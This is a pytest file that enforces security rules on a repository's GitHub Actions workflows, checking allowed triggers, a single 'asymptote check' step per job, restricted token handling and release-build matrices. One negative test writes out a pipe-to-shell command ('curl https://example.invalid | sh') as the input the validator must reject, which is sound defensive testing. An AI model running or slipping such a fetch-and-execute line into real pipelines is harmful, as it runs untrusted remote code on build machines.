"""The repository's workflows are a thin edge over Asymptote: each starts only on its allowed triggers and checks through one `asymptote check` call."""

from __future__ import annotations

import re
import tomllib
from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[1]
DIRECTORY = ROOT / ".github/workflows"
WORKFLOWS = sorted(DIRECTORY.glob("*.yml"))

# The one command a job's checks are, with the product root and the groups it names: Asymptote decides what runs.
CHECK = re.compile(r"asymptote check( --root [\w./-]+)?( --groups [a-z][a-z-]*(,[a-z][a-z-]*)*)?")
# The release itself: a job that does not check runs one job command (`ci/<job>/command.py`) with plain arguments, which no shell
# chains anything to, or only actions (a build matrix). The values it is handed are crates.io's token, from its trusted publishing,
# and the token `gh` creates the GitHub Release with; npm and PyPI exchange the OIDC token themselves.
COMMAND = re.compile(r"uv run ci/[a-z_]+/command\.py( [\w./=-]+)*")
HANDED = {"CARGO_REGISTRY_TOKEN", "GH_TOKEN"}
# What may start a workflow: a hand run, a pull request, a push to main. A schedule starts only the workflows `SCHEDULED` names, and a
# workflow that publishes starts only by hand; `pull_request_target`, which runs a fork's code with the repository's secrets, never.
ALLOWED = {"workflow_dispatch", "pull_request", "push"}
SCHEDULED = {"benchmarks.yml"}
# What may follow a job's check: uploading what its tools left (a bench's documents) as the run's artifact.
UPLOAD = "actions/upload-artifact@"
# The GitHub Release is the one step beside the job command that is not a command of its own: `gh` calls and the checksums they upload.
RELEASE_STEP = "GitHub Release"
# One release per product, over the directories of `dist/archives`, each named for its product's tag.
RELEASE_LINE = re.compile(
    r"for archives in dist/archives/\*/; do|done"
    r"|\s*(tag=\"\$\(basename \"\$archives\"\)\"|\(cd \"\$archives\" && sha256sum -- \* > SHA256SUMS\)|gh release (create|upload|edit) .*)"
)
# The steps that put the declared tools on a machine; a job command runs beside them and installs nothing itself.
SETUP = {"rustup toolchain install", "uv run --script tools/install.py"}


def triggers(workflow: dict) -> set[str]:
    """What starts the workflow. YAML 1.1, which PyYAML reads, takes the key `on` for true."""
    return set(workflow["on" if "on" in workflow else True])


def environment(job: dict) -> str | None:
    """The environment a job runs in, named alone or as `name:`."""
    named = job.get("environment")
    return named.get("name") if isinstance(named, dict) else named


def trigger_problems(name: str, workflow: dict) -> list[str]:
    """What starts the workflow that may not: a trigger outside `ALLOWED` (a schedule outside `SCHEDULED`), a push to a branch other
    than main, and anything but a hand run for a workflow that publishes (a `publish` job, or a job in the `release` environment)."""
    started = triggers(workflow)
    allowed = ALLOWED | ({"schedule"} if name in SCHEDULED else set())
    found = [f"{name} starts on {each}" for each in sorted(started - allowed)]
    on = workflow["on" if "on" in workflow else True]
    if "push" in started and (on.get("push") if isinstance(on, dict) else None) != {"branches": ["main"]}:
        found.append(f"{name} starts on a push to more than main")
    jobs = workflow["jobs"]
    if ("publish" in jobs or any(environment(job) == "release" for job in jobs.values())) and started != {"workflow_dispatch"}:
        found.append(f"{name} publishes, so it starts only by hand")
    return found


def checks(job: dict) -> list[int]:
    """The positions of the job's steps that call `asymptote check`."""
    return [index for index, step in enumerate(job["steps"]) if re.search(r"(^|\s)asymptote check\b", step.get("run", ""))]


def needs(job: dict) -> list[str]:
    """The jobs this job waits for."""
    waits = job.get("needs", [])
    return [waits] if isinstance(waits, str) else list(waits)


def problems(workflow: dict) -> list[str]:
    """What keeps the workflow from being a thin edge over `asymptote check`: a job that calls it more than once, anywhere but
    last, or with more than the one command line; a job that does not check and runs more than one job command; a job neither
    checking nor waiting for one that does; a workflow no job of which checks."""
    jobs = workflow["jobs"]
    found = []
    for name, job in jobs.items():
        positions = checks(job)
        if len(positions) > 1:
            found.append(f"{name} calls asymptote check {len(positions)} times")
        elif positions:
            run = re.sub(r"\$\{\{.*?\}\}", "value", job["steps"][positions[0]]["run"].strip())
            if any(not step.get("uses", "").startswith(UPLOAD) for step in job["steps"][positions[0] + 1 :]):
                found.append(f"{name} does not end in its asymptote check step")
            if not CHECK.fullmatch(run):
                found.append(f"{name} runs {run!r}, not one `asymptote check [--root <dir>] [--groups <groups>]`")
        else:
            steps = [step for step in job["steps"] if "run" in step and step.get("name") != RELEASE_STEP]
            runs = [re.sub(r"\$\{\{.*?\}\}", "value", step["run"].strip()) for step in steps]
            runs = [each for each in runs if each not in SETUP]
            if len(runs) > 1 or any(not COMMAND.fullmatch(each) for each in runs):
                found.append(f"{name} does not check and does not run exactly one job command: {runs}")
            for step in job["steps"]:
                if step.get("name") == RELEASE_STEP:
                    found += [f"{name} releases with {line!r}" for line in step["run"].strip().splitlines() if not RELEASE_LINE.fullmatch(line)]
            if any(set(step.get("env", {})) - HANDED for step in job["steps"]):
                found.append(f"{name} hands a step more than {sorted(HANDED)}")

    def gated(name: str, seen: frozenset[str] = frozenset()) -> bool:
        return bool(checks(jobs[name])) or any(gated(each, seen | {name}) for each in needs(jobs[name]) if each not in seen)

    found += [f"{name} neither checks nor waits for a job that does" for name in jobs if not gated(name)]
    if not any(checks(job) for job in jobs.values()):
        found.append("no job calls asymptote check")
    return found


def job(*run: str, needs: str | None = None) -> dict:
    """A job whose steps run the given commands in order."""
    return {"steps": [{"run": each} for each in run]} | ({"needs": needs} if needs else {})


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda path: path.name)
def test_every_workflow_runs_only_on_its_allowed_triggers(path: Path) -> None:
    """A workflow starts by hand, on a pull request or on a push to main; a schedule starts only the workflows `SCHEDULED` names, and
    a workflow that publishes starts only by hand. The git hook `asymptote init` installs stays the per-change gate."""
    assert trigger_problems(path.name, yaml.safe_load(path.read_text())) == []


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda path: path.name)
def test_every_workflow_checks_through_one_asymptote_call(path: Path) -> None:
    """Beside the steps that set up its machine and install the tools, a job that checks ends in one `asymptote check` call, and
    every other job of the workflow waits for one that does."""
    assert problems(yaml.safe_load(path.read_text())) == []


def test_there_are_workflows_to_hold() -> None:
    assert [path.name for path in WORKFLOWS]


def test_a_job_that_installs_and_ends_in_one_check_is_a_thin_edge() -> None:
    workflow = {"jobs": {"check": job("cargo install --path crates/asymptote/cli --locked", "asymptote check --groups lint,perf")}}
    assert problems(workflow) == []


def test_a_job_that_installs_with_the_script_and_ends_in_one_check_is_a_thin_edge() -> None:
    assert problems({"jobs": {"check": job("uv run --script tools/install.py", "asymptote check --groups test")}}) == []


def test_a_job_command_runs_beside_the_steps_that_install_the_tools() -> None:
    publish = job("rustup toolchain install", "uv run --script tools/install.py", "uv run ci/release/command.py --publish", needs="check")
    assert problems({"jobs": {"check": job("asymptote check"), "publish": publish}}) == []


def test_a_job_that_waits_for_the_checking_job_is_gated_by_it() -> None:
    workflow = {"jobs": {"check": job("asymptote check"), "publish": job("uv run ci/release/command.py --publish", needs="check")}}
    assert problems(workflow) == []


def test_a_job_that_runs_more_than_its_job_command_is_refused() -> None:
    workflow = {"jobs": {"check": job("asymptote check"), "publish": job("echo", "uv run ci/release/command.py", needs="check")}}
    assert len(problems(workflow)) == 1 and "exactly one job command" in problems(workflow)[0]
    chained = {"jobs": {"check": job("asymptote check"), "publish": job("uv run ci/release/command.py && echo", needs="check")}}
    assert len(problems(chained)) == 1


def test_a_step_handed_more_than_the_tokens_is_refused() -> None:
    publish = job("uv run ci/release/command.py", needs="check")
    publish["steps"][0]["env"] = {"CARGO_REGISTRY_TOKEN": "x", "OTHER": "y"}
    assert problems({"jobs": {"check": job("asymptote check"), "publish": publish}}) == [
        "publish hands a step more than ['CARGO_REGISTRY_TOKEN', 'GH_TOKEN']"
    ]


def test_a_job_that_does_not_end_in_its_check_is_refused() -> None:
    assert problems({"jobs": {"check": job("asymptote check", "echo done")}}) == ["check does not end in its asymptote check step"]


def test_a_check_may_take_its_group_from_the_matrix_and_upload_what_its_tools_left() -> None:
    # The expression is written in pieces, since the template this file is rendered from reads two braces as its own.
    expression = "$" + "{" * 2 + " matrix.group " + "}" * 2
    checking = job("uv run --script tools/install.py", f"asymptote check --groups {expression}")
    checking["steps"].append({"uses": "actions/upload-artifact@0000000000000000000000000000000000000000", "with": {"path": "target"}})
    assert problems({"jobs": {"check": checking}}) == []


def test_a_job_that_checks_twice_is_refused() -> None:
    assert problems({"jobs": {"check": job("asymptote check --groups lint", "asymptote check --groups test")}}) == [
        "check calls asymptote check 2 times"
    ]


def test_a_check_that_chains_another_command_is_refused() -> None:
    assert problems({"jobs": {"check": job("asymptote check && echo done")}}) == [
        "check runs 'asymptote check && echo done', not one `asymptote check [--root <dir>] [--groups <groups>]`"
    ]


def test_a_job_that_neither_checks_nor_waits_for_a_check_is_refused() -> None:
    workflow = {"jobs": {"check": job("asymptote check"), "publish": job("uv run ci/release/command.py --publish")}}
    assert problems(workflow) == ["publish neither checks nor waits for a job that does"]


def test_a_workflow_that_never_calls_asymptote_is_refused() -> None:
    assert "no job calls asymptote check" in problems({"jobs": {"build": job("uv run ci/release/command.py")}})


def test_a_trigger_other_than_dispatch_is_told_apart() -> None:
    pushed = yaml.safe_load("on:\n  push:\n  workflow_dispatch:\njobs: {}\n")
    dispatched = yaml.safe_load("on:\n  workflow_dispatch:\njobs: {}\n")
    assert triggers(pushed) != {"workflow_dispatch"}
    assert triggers(dispatched) == {"workflow_dispatch"}


def test_a_schedule_starts_only_the_scheduled_workflows() -> None:
    scheduled = yaml.safe_load("on:\n  schedule:\n    - cron: '0 3 * * 0'\njobs: {}\n")
    assert trigger_problems("check.yml", scheduled) == ["check.yml starts on schedule"]
    assert trigger_problems("benchmarks.yml", scheduled) == []


def test_a_pull_request_target_is_refused() -> None:
    """`pull_request_target` runs a fork's code with the repository's secrets."""
    target = yaml.safe_load("on:\n  pull_request_target:\njobs: {}\n")
    assert trigger_problems("check.yml", target) == ["check.yml starts on pull_request_target"]


def test_a_push_starts_a_workflow_only_on_main() -> None:
    main = yaml.safe_load("on:\n  push:\n    branches: [main]\njobs: {}\n")
    every = yaml.safe_load("on:\n  push:\njobs: {}\n")
    other = yaml.safe_load("on:\n  push:\n    branches: [main, release]\njobs: {}\n")
    assert trigger_problems("check.yml", main) == []
    assert trigger_problems("check.yml", every) == trigger_problems("check.yml", other) == ["check.yml starts on a push to more than main"]


def test_a_workflow_that_publishes_starts_only_by_hand() -> None:
    publish = {"environment": "release", "steps": [{"run": "uv run ci/release/command.py --publish"}]}
    on_a_pull_request = {"on": {"workflow_dispatch": None, "pull_request": None}, "jobs": {"publish": publish}}
    assert trigger_problems("release.yml", on_a_pull_request) == ["release.yml publishes, so it starts only by hand"]
    by_hand = {"on": {"workflow_dispatch": None}, "jobs": {"upload": {"environment": {"name": "release"}, "steps": []}}}
    assert trigger_problems("release.yml", by_hand) == []
    on_a_push = by_hand | {"on": {"push": {"branches": ["main"]}}}
    assert trigger_problems("release.yml", on_a_push) == ["release.yml publishes, so it starts only by hand"]


def test_only_the_release_job_that_uploads_is_handed_a_token_and_only_after_the_maintainer_s_gate() -> None:
    """The registry token reaches the one job that publishes, and only when all three of the gate hold (`PUBLISH`): a dry run
    never holds it."""
    workflow = yaml.safe_load((DIRECTORY / "release.yml").read_text())
    handed = {
        name
        for name, defined in workflow["jobs"].items()
        if any("CARGO_REGISTRY_TOKEN" in step.get("env", {}) for step in defined["steps"])
    }
    assert handed == {"publish"}
    publish = workflow["jobs"]["publish"]
    assert publish["environment"] == "release" and "RELEASE_MAINTAINER" in publish["env"]["PUBLISH"]
    # One product per run, published only from its own tag.
    assert "startsWith(github.ref_name, format('idiomatic-sh-{0}-v', inputs.product))" in publish["env"]["PUBLISH"]
    (product,) = [workflow["on" if "on" in workflow else True]["workflow_dispatch"]["inputs"]["product"]]
    assert product["required"] is True and product["options"] == ["ryo", "tastemaker", "asymptote"]
    (command,) = [step["run"] for step in publish["steps"] if "ci/release/command.py" in step.get("run", "")]
    assert "--product ${{ inputs.product }}" in command
    (checking,) = [step["run"] for step in workflow["jobs"]["check"]["steps"] if "asymptote check" in step.get("run", "")]
    assert checking == "asymptote check --root ${{ matrix.root || format('crates/{0}', inputs.product) }} --groups ${{ matrix.group }}"
    # Every product's release tools, one job per group: each group a product's asymptote.toml names beside lint, check, perf and
    # build is a row of the matrix, and every row is a group some product names.
    released = {
        tool["group"]
        for manifest in sorted(ROOT.glob("crates/*/asymptote.toml"))
        for tool in tomllib.loads(manifest.read_text())["tools"]
        if tool["group"].startswith("release")
    }
    rows = workflow["jobs"]["check"]["strategy"]["matrix"]["include"]
    assert {row["group"] for row in rows} == released | {"lint", "clippy", "api", "check"}
    # The check workflow's groups too, the release being the only gate: lint from the root, the tests on every machine.
    assert [row.get("root") for row in rows if row["group"] == "lint"] == ["."]
    assert sorted(row["runner"] for row in rows if row["group"] == "check") == sorted(
        ["ubuntu-26.04", "ubuntu-26.04-arm", "macos-26", "windows-2025"]
    )
    assert [row["runner"] for row in rows if row["group"] == "api"] == ["macos-26"]
    # The tests on every machine the products ship to; every other group once, on Linux.
    assert sorted(row["runner"] for row in rows if row["group"] == "release-tests") == sorted(
        ["ubuntu-26.04", "ubuntu-26.04-arm", "macos-26", "windows-2025"]
    )
    assert all(row["runner"] == "ubuntu-26.04" for row in rows if row["group"] not in {"release-tests", "check", "api"})
    assert len(rows) == len({(row["runner"], row["group"]) for row in rows})
    (uploading,) = [step for step in publish["steps"] if "CARGO_REGISTRY_TOKEN" in step.get("env", {})]
    # Trusted publishing only: crates.io's token is the one its auth action exchanged, and no step reads a secret.
    assert uploading["env"]["CARGO_REGISTRY_TOKEN"] == "${{ env.PUBLISH == 'true' && steps.crates-io.outputs.token || '' }}"
    (auth,) = [step for step in publish["steps"] if step.get("uses", "").startswith("rust-lang/crates-io-auth-action@")]
    assert auth["if"] == "env.PUBLISH == 'true'"
    assert "secrets." not in (DIRECTORY / "release.yml").read_text()
    assert publish["permissions"]["id-token"] == "write"
    # npm's trusted publishing needs npm 11.5.1 or later, which the latest Node 24 bundles.
    (node,) = [step for step in publish["steps"] if step.get("uses", "").startswith("actions/setup-node@")]
    assert node["with"]["node-version"] == 24 and node["with"]["check-latest"] is True
    (release,) = [step for step in publish["steps"] if step.get("name") == RELEASE_STEP]
    assert release["if"] == "env.PUBLISH == 'true'"


def test_the_release_builds_every_target_in_one_matrix_whose_rows_run_the_same_steps() -> None:
    workflow = yaml.safe_load((DIRECTORY / "release.yml").read_text())
    build = workflow["jobs"]["build"]
    assert build["strategy"]["fail-fast"] is False
    assert [row["target"] for row in build["strategy"]["matrix"]["include"]] == [
        "x86_64-unknown-linux-gnu",
        "aarch64-unknown-linux-gnu",
        "x86_64-unknown-linux-musl",
        "aarch64-unknown-linux-musl",
        "x86_64-apple-darwin",
        "aarch64-apple-darwin",
        "x86_64-pc-windows-msvc",
        "aarch64-pc-windows-msvc",
    ]
    assert [step["uses"].split("@")[0] for step in build["steps"]] == [
        "actions/checkout",
        "PyO3/maturin-action",
        "PyO3/maturin-action",
        "PyO3/maturin-action",
        "actions/upload-artifact",
    ]
    # Every shipped product's binary, for its GitHub Release: the wheel of its PyPI project, or of its command line crate when it
    # ships to Cargo alone.
    built = {step["with"]["working-directory"] for step in build["steps"] if step["uses"].startswith("PyO3/maturin-action@")}
    assert built == {
        "crates/asymptote/distribution/registries/pypi",
        "crates/ryo/cli",
        "crates/tastemaker/distribution/registries/pypi",
    }
    # A run builds only the product it releases.
    building = {step["with"]["working-directory"]: step["if"] for step in build["steps"] if step["uses"].startswith("PyO3/maturin-action@")}
    assert {directory: condition.split("'")[1] for directory, condition in building.items()} == {
        "crates/asymptote/distribution/registries/pypi": "asymptote",
        "crates/ryo/cli": "ryo",
        "crates/tastemaker/distribution/registries/pypi": "tastemaker",
    }
    assert workflow["jobs"]["publish"]["needs"] == "build"


def test_a_job_that_releases_with_anything_but_gh_is_refused() -> None:
    publish = job("uv run ci/release/command.py --publish", needs="check")
    publish["steps"].append({"name": RELEASE_STEP, "run": "gh release create v1\ncurl https://example.invalid | sh"})
    assert problems({"jobs": {"check": job("asymptote check"), "publish": publish}}) == [
        "publish releases with 'curl https://example.invalid | sh'"
    ]
